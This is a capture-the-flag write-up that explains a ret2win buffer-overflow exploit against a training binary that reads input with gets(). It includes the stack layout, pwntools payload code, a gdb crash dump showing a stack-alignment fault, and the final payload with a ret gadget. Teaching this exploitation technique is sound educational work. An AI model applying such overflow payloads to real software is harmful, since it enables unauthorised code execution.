# Headquarters Improved

Refer to [`solve.py`](solve.py) for script.

## Vulnerability

The same `gets()` vulnerability exists, same as per `headquarters`. However, this time our goal isn't to overwrite a variable. Our goal is to perform ret2win and overwrite the return address to the `admin()` function, which will give us the flag.

## Exploit

The stack looks like this:

```
top of stack
--------------------------------
|         char name[32]        | < 32 bytes
--------------------------------
|  return based pointer (rbp)  | < 8 bytes
--------------------------------
|  saved return pointer (rip)  | < 8 bytes
--------------------------------
bottom of stack
```

This time, we need an input with a length greater than 32 in order to overflow into the RBP and RIP. In this challenge, we are only concerned about the RIP.

The saved RIP stores the address of the next instruction to execute, upon returning from a function (i.e. `return`).

We can overwrite this value to the address of `admin()`. 

> [!NOTE]
> PIE is not enabled in this binary, so we are able to directly jump to win() without a leak. If PIE was enabled, our binary would get loaded into a randomized memory address each run, and we would have required a leak.

Thus, the payload is like this:

```python
payload = b'A'*32 # fill up the `name` buffer
payload += b'B'*8 # fill up the RBP
payload += p64(elf.sym.admin) # overwrite RIP to point to admin()
```

However, when running that, we get an error, which we can analyse further using gdb:

```
Program received signal SIGSEGV, Segmentation fault.
0x00007f0444df2973 in __sigemptyset (set=<optimized out>) at ../sysdeps/unix/sysv/linux/sigsetops.h:54
54      ../sysdeps/unix/sysv/linux/sigsetops.h: No such file or directory.
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x000000000040202b  →  "cat flag.txt"
$rcx   : 0x00007f0444eb6887  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x1
$rsp   : 0x00007ffd41842158  →  0x0000000000000001
$rbp   : 0x00007ffd41842518  →  "BBBBBBBB"
$rsi   : 0x1
$rdi   : 0x000000000040202b  →  "cat flag.txt"
$rip   : 0x00007f0444df2973  →  <do_system+115> movaps XMMWORD PTR [rsp], xmm1
$r8    : 0x00007f0444fbea70  →  0x0000000000000000
$r9    : 0x7fffffff
$r10   : 0x00007f0444daf5a8  →  0x000f002200002ab7
$r11   : 0x00007f0444df2d70  →  <system+0> endbr64
$r12   : 0x00007ffd41842628  →  0x00007ffd41842fe8  →  "/home/ctfplayer/ctf-creations/sctf6/training/headq[...]"
$r13   : 0x00007f0444fbe7a0  →  0x0000000000000000
$r14   : 0x00007f0444fbe840  →  0x0000000000000000
$r15   : 0x00007f0445020040  →  0x00007f04450212e0  →  0x0000000000000000
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd41842158│+0x0000: 0x0000000000000001   ← $rsp
0x00007ffd41842160│+0x0008: 0x000000000040202b  →  "cat flag.txt"
0x00007ffd41842168│+0x0010: 0x00007f0444fbea70  →  0x0000000000000000
0x00007ffd41842170│+0x0018: 0x00000000ffffffff
0x00007ffd41842178│+0x0020: 0x000000000000000d ("\r"?)
0x00007ffd41842180│+0x0028: 0x00007f0444fe4160  →  0x00007f0444da2000  →  0x03010102464c457f
0x00007ffd41842188│+0x0030: 0x00007f0444fbc1b8  →  0x00007f0445001660  →  <_dl_audit_preinit+0> endbr64
0x00007ffd41842190│+0x0038: 0x00000000004011ce  →  <main+0> endbr64
─────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f0444df2950 <do_system+80>   mov    QWORD PTR [rsp+0x180], 0x1
   0x7f0444df295c <do_system+92>   mov    DWORD PTR [rsp+0x208], 0x0
   0x7f0444df2967 <do_system+103>  mov    QWORD PTR [rsp+0x188], 0x0
 → 0x7f0444df2973 <do_system+115>  movaps XMMWORD PTR [rsp], xmm1
   0x7f0444df2977 <do_system+119>  lock   cmpxchg DWORD PTR [rip+0x1cbe01], edx        # 0x7f0444fbe780 <lock>
   0x7f0444df297f <do_system+127>  jne    0x7f0444df2c30 <do_system+816>
   0x7f0444df2985 <do_system+133>  mov    eax, DWORD PTR [rip+0x1cbdf9]        # 0x7f0444fbe784 <sa_refcntr>
   0x7f0444df298b <do_system+139>  lea    edx, [rax+0x1]
   0x7f0444df298e <do_system+142>  mov    DWORD PTR [rip+0x1cbdf0], edx        # 0x7f0444fbe784 <sa_refcntr>
─────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "headquarters2", stopped 0x7f0444df2973 in __sigemptyset (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f0444df2973 → __sigemptyset(set=<optimized out>)
[#1] 0x7f0444df2973 → do_system(line=0x40202b "cat flag.txt")
[#2] 0x4011cb → admin()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

Basically, the instruciton causing the sigsegv is `movaps XMMWORD PTR [rsp], xmm1`. This is a common error that can occur when the memory address referenced in the instruction is not 16 bytes-aligned (in this case, rsp = 0x00007ffd41842158 which is not 16 bytes aligned).

Thus, to fix that, we can add a ret gadget (aka an address which points to a ret instruction). Doing so will enable rsp to be 16 bytes aligned.

```bash
# to find the gadget
ropper -f headquarters2 

# in the output find this:
0x000000000040101a: ret;
```

Final payload:

```python
payload = b'A'*32 # fill up the `name` buffer
payload += b'B'*8 # fill up the RBP
payload += p64(0x40101a) # ret for stack alignment issues
payload += p64(elf.sym.admin) # overwrite RIP to point to admin()
```

